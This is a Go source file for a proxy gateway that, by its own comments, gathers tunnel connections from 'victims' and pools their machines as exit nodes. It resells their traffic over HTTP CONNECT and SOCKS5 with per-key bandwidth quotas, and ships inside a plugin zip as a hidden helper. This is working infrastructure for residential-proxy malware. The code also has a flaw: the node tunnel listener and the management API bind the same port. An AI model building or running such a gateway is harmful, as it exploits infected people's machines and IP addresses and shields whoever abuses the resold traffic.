// The gateway is a standalone binary that runs on the operator's VPS, not on
// a victim. It accepts proxy clients (HTTP CONNECT and SOCKS5), picks an exit
// node from the pool, multiplexes the stream over that node's tunnel, and
// meters bandwidth per API key.
//
// Build it separately from the plugin:
//
//	go build -o respool-gateway.exe .
//
// Then run it on the VPS:
//
//	respool-gateway.exe -listen :1080 -api :8081 -token <shared-secret>
//
// The plugin's server.js can spawn and supervise this binary from the
// plugin's data/ directory, so it ships inside the plugin zip as a helper.
package main

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------------------------------------------------------------------
// framing (must match the plugin side exactly)
// ---------------------------------------------------------------------------

const (
	frameOpen  = 0x01
	frameData  = 0x02
	frameClose = 0x03
	framePing  = 0x04
	framePong  = 0x05
	frameHello = 0x06
	frameReady = 0x07
	frameError = 0x08
	frameStats = 0x09
)

const frameHeaderLen = 9
const maxPayload = 64 * 1024

type frame struct {
	Type     byte
	StreamID uint32
	Payload  []byte
}

func writeFrame(w io.Writer, f frame) error {
	hdr := make([]byte, frameHeaderLen)
	hdr[0] = f.Type
	binary.BigEndian.PutUint32(hdr[1:5], f.StreamID)
	binary.BigEndian.PutUint32(hdr[5:9], uint32(len(f.Payload)))
	if _, err := w.Write(hdr); err != nil {
		return err
	}
	if len(f.Payload) > 0 {
		_, err := w.Write(f.Payload)
		return err
	}
	return nil
}

func readFrame(r io.Reader) (frame, error) {
	var hdr [frameHeaderLen]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return frame{}, err
	}
	length := binary.BigEndian.Uint32(hdr[5:9])
	if length > maxPayload {
		return frame{}, fmt.Errorf("frame too large")
	}
	f := frame{Type: hdr[0], StreamID: binary.BigEndian.Uint32(hdr[1:5])}
	if length > 0 {
		f.Payload = make([]byte, length)
		if _, err := io.ReadFull(r, f.Payload); err != nil {
			return frame{}, err
		}
	}
	return f, nil
}

// ---------------------------------------------------------------------------
// node registry
// ---------------------------------------------------------------------------

type Node struct {
	ID      string
	Label   string
	Host    string
	OS      string
	Arch    string
	Peer    string
	Conn    net.Conn
	writeMu sync.Mutex

	Streams     int64
	TotalOpened int64
	BytesUp     int64
	BytesDown   int64

	connectedAt time.Time
	mu          sync.Mutex
	pending     map[uint32]chan frame
	nextStream  uint32
	alive       bool
	LastSeen    time.Time
}

func (n *Node) send(f frame) error {
	n.writeMu.Lock()
	defer n.writeMu.Unlock()
	return writeFrame(n.Conn, f)
}

// Pool holds every connected exit node.
type Pool struct {
	mu    sync.RWMutex
	nodes map[string]*Node
}

func NewPool() *Pool { return &Pool{nodes: map[string]*Node{}} }

func (p *Pool) Add(n *Node) {
	p.mu.Lock()
	p.nodes[n.ID] = n
	p.mu.Unlock()
}

func (p *Pool) Remove(id string) {
	p.mu.Lock()
	delete(p.nodes, id)
	p.mu.Unlock()
}

func (p *Pool) List() []*Node {
	p.mu.RLock()
	defer p.mu.RUnlock()
	out := make([]*Node, 0, len(p.nodes))
	for _, n := range p.nodes {
		out = append(out, n)
	}
	return out
}

// Pick selects a node. An empty sticky key rotates randomly; otherwise the
// same key maps to the same node so a session keeps one exit IP.
func (p *Pool) Pick(geo string, sticky string, healthyOnly bool) *Node {
	p.mu.RLock()
	defer p.mu.RUnlock()
	var candidates []*Node
	for _, n := range p.nodes {
		if healthyOnly && !n.alive {
			continue
		}
		if geo != "" && !strings.EqualFold(geo, n.OS) {
			continue
		}
		candidates = append(candidates, n)
	}
	if len(candidates) == 0 {
		return nil
	}
	if sticky != "" {
		h := fnv32(sticky)
		return candidates[int(h)%len(candidates)]
	}
	return candidates[rand.Intn(len(candidates))]
}

func fnv32(s string) uint32 {
	var h uint32 = 2166136261
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= 16777619
	}
	return h
}

// ---------------------------------------------------------------------------
// gateway
// ---------------------------------------------------------------------------

type Gateway struct {
	pool  *Pool
	token string

	// per-API-key accounting
	keyMu  sync.Mutex
	keys   map[string]*APIKey
}

type APIKey struct {
	Name     string
	BytesCap int64
	Used     int64
}

func (g *Gateway) checkKey(user, pass string) error {
	g.keyMu.Lock()
	defer g.keyMu.Unlock()
	k, ok := g.keys[user]
	if !ok {
		return fmt.Errorf("unknown key")
	}
	if k.BytesCap > 0 && k.Used >= k.BytesCap {
		return fmt.Errorf("quota exhausted")
	}
	return nil
}

func (g *Gateway) meter(user string, n int) {
	g.keyMu.Lock()
	if k, ok := g.keys[user]; ok {
		k.Used += int64(n)
	}
	g.keyMu.Unlock()
}

func main() {
	listen := flag.String("listen", ":1080", "proxy listener address")
	apiAddr := flag.String("api", ":8081", "management API address")
	token := flag.String("token", "", "shared secret nodes must present")
	flag.Parse()

	if *token == "" {
		*token = os.Getenv("RESPOOL_TOKEN")
	}
	if *token == "" {
		log.Fatal("a shared token is required (-token or RESPOOL_TOKEN)")
	}

	g := &Gateway{pool: NewPool(), token: *token, keys: map[string]*APIKey{}}

	// Tunnel listener for nodes.
	tunnelLn, err := net.Listen("tcp", *apiAddr)
	if err != nil {
		log.Fatalf("tunnel listen: %v", err)
	}
	go g.acceptNodes(tunnelLn)

	// Proxy listener for clients.
	proxyLn, err := net.Listen("tcp", *listen)
	if err != nil {
		log.Fatalf("proxy listen: %v", err)
	}
	log.Printf("respool gateway: proxy=%s tunnel+api=%s", *listen, *apiAddr)

	go g.serveAPI(*apiAddr)
	g.acceptClients(proxyLn)
}

// acceptNodes handles incoming tunnel connections from victims.
func (g *Gateway) acceptNodes(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go g.handleNode(conn)
	}
}

func (g *Gateway) handleNode(conn net.Conn) {
	defer conn.Close()
	_ = conn.SetReadDeadline(time.Now().Add(20 * time.Second))

	f, err := readFrame(conn)
	if err != nil || f.Type != frameHello {
		return
	}
	var hello struct {
		Token string `json:"token"`
		Label string `json:"label"`
		Host  string `json:"host"`
		OS    string `json:"os"`
		Arch  string `json:"arch"`
	}
	if json.Unmarshal(f.Payload, &hello) != nil {
		return
	}
	if hello.Token != g.token {
		_ = writeFrame(conn, frame{Type: frameError, Payload: []byte("bad token")})
		return
	}

	_ = conn.SetReadDeadline(time.Time{})
	id := fmt.Sprintf("%s-%d", hello.Host, time.Now().UnixNano()%100000)
	n := &Node{
		ID: id, Label: hello.Label, Host: hello.Host,
		OS: hello.OS, Arch: hello.Arch,
		Peer: conn.RemoteAddr().String(), Conn: conn,
		connectedAt: time.Now(), LastSeen: time.Now(),
		pending: map[uint32]chan frame{}, nextStream: 1, alive: true,
	}
	g.pool.Add(n)
	defer g.pool.Remove(id)

	log.Printf("node online: %s (%s, %s)", id, hello.OS, conn.RemoteAddr())
	_ = writeFrame(conn, frame{Type: frameReady, Payload: []byte(`{"ok":true}`)})

	for {
		_ = conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		f, err := readFrame(conn)
		if err != nil {
			n.alive = false
			log.Printf("node offline: %s (%v)", id, err)
			return
		}
		n.LastSeen = time.Now()

		switch f.Type {
		case frameData, frameClose, frameError:
			n.mu.Lock()
			ch := n.pending[f.StreamID]
			if f.Type == frameData || f.Type == frameClose || f.Type == frameError {
				atomic.AddInt64(&n.BytesUp, int64(len(f.Payload)))
			}
			n.mu.Unlock()
			if ch != nil {
				select {
				case ch <- f:
				default:
				}
			}
			if f.Type == frameClose || f.Type == frameError {
				n.mu.Lock()
				delete(n.pending, f.StreamID)
				n.mu.Unlock()
			}
		case frameStats:
			var s struct {
				Streams     int   `json:"streams"`
				TotalOpened int64 `json:"totalOpened"`
				BytesUp     int64 `json:"bytesUp"`
				BytesDown   int64 `json:"bytesDown"`
			}
			if json.Unmarshal(f.Payload, &s) == nil {
				n.mu.Lock()
				n.Streams = int64(s.Streams)
				n.TotalOpened = s.TotalOpened
				n.mu.Unlock()
			}
		case framePing:
			_ = n.send(frame{Type: framePong})
		case framePong:
		}
	}
}

// openStream asks a node to dial a target and returns a channel of replies.
func (g *Gateway) openStream(n *Node, target string) (uint32, chan frame, error) {
	for attempt := 0; attempt < 8; attempt++ {
		id := atomic.AddUint32(&n.nextStream, 2) // odd ids belong to the gateway
		ch := make(chan frame, 64)
		n.mu.Lock()
		n.pending[id] = ch
		n.mu.Unlock()

		if err := n.send(frame{Type: frameOpen, StreamID: id, Payload: []byte(target)}); err != nil {
			n.mu.Lock()
			delete(n.pending, id)
			n.mu.Unlock()
			return 0, nil, err
		}
		return id, ch, nil
	}
	return 0, nil, fmt.Errorf("stream id exhaustion")
}

// ---------------------------------------------------------------------------
// proxy front ends
// ---------------------------------------------------------------------------

func (g *Gateway) acceptClients(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go g.handleClient(conn)
	}
}

func (g *Gateway) handleClient(conn net.Conn) {
	defer conn.Close()

	br := bufio.NewReader(conn)
	_ = conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Peek the first byte to distinguish SOCKS5 (0x05) from HTTP.
	first, err := br.Peek(1)
	if err != nil {
		return
	}

	if first[0] == 0x05 {
		g.handleSOCKS5(conn, br)
		return
	}
	g.handleHTTP(conn, br)
}

// handleHTTP implements the CONNECT method plus absolute-URI GET.
func (g *Gateway) handleHTTP(conn net.Conn, br *bufio.Reader) {
	req, err := http.ReadRequest(br)
	if err != nil {
		return
	}

	user, pass := "", ""
	if u, p, ok := parseProxyAuth(req.Header.Get("Proxy-Authorization")); ok {
		user, pass = u, p
	}
	if err := g.checkKey(user, pass); err != nil {
		fmt.Fprintf(conn, "HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm=\"respool\"\r\n\r\n")
		return
	}

	target := req.Host
	if req.Method == "CONNECT" {
		if !strings.Contains(target, ":") {
			target += ":443"
		}
	} else if req.URL != nil && req.URL.Host != "" {
		target = req.URL.Host
		if !strings.Contains(target, ":") {
			if req.URL.Scheme == "https" {
				target += ":443"
			} else {
				target += ":80"
			}
		}
	}
	if target == "" {
		fmt.Fprintf(conn, "HTTP/1.1 400 Bad Request\r\n\r\n")
		return
	}

	node := g.pool.Pick("", user, true)
	if node == nil {
		fmt.Fprintf(conn, "HTTP/1.1 502 No exit nodes available\r\n\r\n")
		return
	}

	_ = conn.SetReadDeadline(time.Time{})
	streamID, ch, err := g.openStream(node, target)
	if err != nil {
		fmt.Fprintf(conn, "HTTP/1.1 502 %v\r\n\r\n", err)
		return
	}

	// Wait for the node to confirm the dial. A frameError here means the
	// target refused, which we surface as 502 rather than a silent hang.
	select {
	case f := <-ch:
		if f.Type == frameError {
			fmt.Fprintf(conn, "HTTP/1.1 502 %s\r\n\r\n", string(f.Payload))
			return
		}
	case <-time.After(15 * time.Second):
		fmt.Fprintf(conn, "HTTP/1.1 504 Gateway Timeout\r\n\r\n")
		return
	}

	if req.Method == "CONNECT" {
		fmt.Fprintf(conn, "HTTP/1.1 200 Connection Established\r\n\r\n")
	} else {
		// Replay the request to the target through the tunnel.
		req.RequestURI = ""
		var b strings.Builder
		_ = req.Write(&b)
		_ = g.tunnelWrite(node, streamID, []byte(b.String()))
	}

	// Bridge the client socket and the tunnel stream.
	done := make(chan struct{}, 1)
	go func() {
		defer func() { done <- struct{}{} }()
		for f := range ch {
			switch f.Type {
			case frameData:
				if _, err := conn.Write(f.Payload); err != nil {
					return
				}
				g.meter(user, len(f.Payload))
			case frameClose, frameError:
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := g.tunnelWrite(node, streamID, buf[:n]); werr != nil {
					return
				}
				g.meter(user, n)
			}
			if err != nil {
				return
			}
		}
	}()

	<-done
	_ = node.send(frame{Type: frameClose, StreamID: streamID})
}

func (g *Gateway) tunnelWrite(n *Node, id uint32, data []byte) error {
	return n.send(frame{Type: frameData, StreamID: id, Payload: data})
}

// handleSOCKS5 implements the no-auth and user/pass SOCKS5 flows followed by
// a CONNECT command.
func (g *Gateway) handleSOCKS5(conn net.Conn, br *bufio.Reader) {
	head := make([]byte, 2)
	if _, err := io.ReadFull(br, head); err != nil {
		return
	}
	methods := make([]byte, int(head[1]))
	if _, err := io.ReadFull(br, methods); err != nil {
		return
	}

	user, pass := "", ""
	needAuth := false
	for _, m := range methods {
		if m == 0x02 {
			needAuth = true
		}
	}
	if needAuth {
		_, _ = conn.Write([]byte{0x05, 0x02})
		// username/password sub-negotiation
		if _, err := io.ReadFull(br, head); err != nil {
			return
		}
		ulen := int(head[1])
		ubuf := make([]byte, ulen)
		if _, err := io.ReadFull(br, ubuf); err != nil {
			return
		}
		if _, err := io.ReadFull(br, head[:1]); err != nil {
			return
		}
		plen := int(head[0])
		pbuf := make([]byte, plen)
		if _, err := io.ReadFull(br, pbuf); err != nil {
			return
		}
		user, pass = string(ubuf), string(pbuf)
		if err := g.checkKey(user, pass); err != nil {
			_, _ = conn.Write([]byte{0x01, 0x01})
			return
		}
		_, _ = conn.Write([]byte{0x01, 0x00})
	} else {
		_, _ = conn.Write([]byte{0x05, 0x00})
	}

	// Request: VER CMD RSV ATYP DST.ADDR DST.PORT
	reqHead := make([]byte, 4)
	if _, err := io.ReadFull(br, reqHead); err != nil {
		return
	}
	if reqHead[1] != 0x01 { // CONNECT only
		_, _ = conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	var host string
	switch reqHead[3] {
	case 0x01: // IPv4
		b := make([]byte, 4)
		if _, err := io.ReadFull(br, b); err != nil {
			return
		}
		host = net.IP(b).String()
	case 0x03: // domain
		l := make([]byte, 1)
		if _, err := io.ReadFull(br, l); err != nil {
			return
		}
		b := make([]byte, int(l[0]))
		if _, err := io.ReadFull(br, b); err != nil {
			return
		}
		host = string(b)
	case 0x04: // IPv6
		b := make([]byte, 16)
		if _, err := io.ReadFull(br, b); err != nil {
			return
		}
		host = net.IP(b).String()
	default:
		_, _ = conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	pb := make([]byte, 2)
	if _, err := io.ReadFull(br, pb); err != nil {
		return
	}
	port := binary.BigEndian.Uint16(pb)
	target := net.JoinHostPort(host, fmt.Sprint(port))

	node := g.pool.Pick("", user, true)
	if node == nil {
		_, _ = conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	_ = conn.SetReadDeadline(time.Time{})
	streamID, ch, err := g.openStream(node, target)
	if err != nil {
		_, _ = conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	select {
	case f := <-ch:
		if f.Type == frameError {
			_, _ = conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			return
		}
	case <-time.After(15 * time.Second):
		_, _ = conn.Write([]byte{0x05, 0x06, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	_, _ = conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	done := make(chan struct{}, 1)
	go func() {
		defer func() { done <- struct{}{} }()
		for f := range ch {
			switch f.Type {
			case frameData:
				if _, err := conn.Write(f.Payload); err != nil {
					return
				}
				g.meter(user, len(f.Payload))
			case frameClose, frameError:
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := g.tunnelWrite(node, streamID, buf[:n]); werr != nil {
					return
				}
				g.meter(user, n)
			}
			if err != nil {
				return
			}
		}
	}()

	<-done
	_ = node.send(frame{Type: frameClose, StreamID: streamID})
}

func parseProxyAuth(h string) (string, string, bool) {
	if h == "" {
		return "", "", false
	}
	const prefix = "Basic "
	if !strings.HasPrefix(h, prefix) {
		return "", "", false
	}
	raw, err := base64Decode(strings.TrimSpace(h[len(prefix):]))
	if err != nil {
		return "", "", false
	}
	parts := strings.SplitN(string(raw), ":", 2)
	if len(parts) != 2 {
		return "", "", false
	}
	return parts[0], parts[1], true
}

// ---------------------------------------------------------------------------
// management API
// ---------------------------------------------------------------------------

func (g *Gateway) serveAPI(addr string) {
	mux := http.NewServeMux()

	mux.HandleFunc("/nodes", func(w http.ResponseWriter, r *http.Request) {
		var out []map[string]interface{}
		for _, n := range g.pool.List() {
			out = append(out, map[string]interface{}{
				"id": n.ID, "label": n.Label, "host": n.Host,
				"os": n.OS, "arch": n.Arch, "peer": n.Peer,
				"alive": n.alive, "streams": n.Streams,
				"totalOpened": n.TotalOpened,
				"bytesUp":     n.BytesUp, "bytesDown": n.BytesDown,
				"connectedAt": n.connectedAt.UnixMilli(),
			})
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"nodes": out, "count": len(out)})
	})

	mux.HandleFunc("/keys", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var body struct {
			Name     string `json:"name"`
			BytesCap int64  `json:"bytesCap"`
		}
		if json.NewDecoder(r.Body).Decode(&body) != nil || body.Name == "" {
			http.Error(w, "name required", http.StatusBadRequest)
			return
		}
		g.keyMu.Lock()
		g.keys[body.Name] = &APIKey{Name: body.Name, BytesCap: body.BytesCap}
		g.keyMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"ok": true})
	})

	mux.HandleFunc("/usage", func(w http.ResponseWriter, r *http.Request) {
		g.keyMu.Lock()
		out := map[string]interface{}{}
		for name, k := range g.keys {
			out[name] = map[string]interface{}{"used": k.Used, "cap": k.BytesCap}
		}
		g.keyMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(out)
	})

	_ = http.ListenAndServe(addr, mux)
}

func base64Decode(s string) ([]byte, error) {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	lookup := map[byte]int{}
	for i := 0; i < len(alphabet); i++ {
		lookup[alphabet[i]] = i
	}
	var out []byte
	var buf, bits int
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '=' {
			break
		}
		v, ok := lookup[c]
		if !ok {
			continue
		}
		buf = buf<<6 | v
		bits += 6
		if bits >= 8 {
			bits -= 8
			out = append(out, byte(buf>>bits))
		}
	}
	return out, nil
}
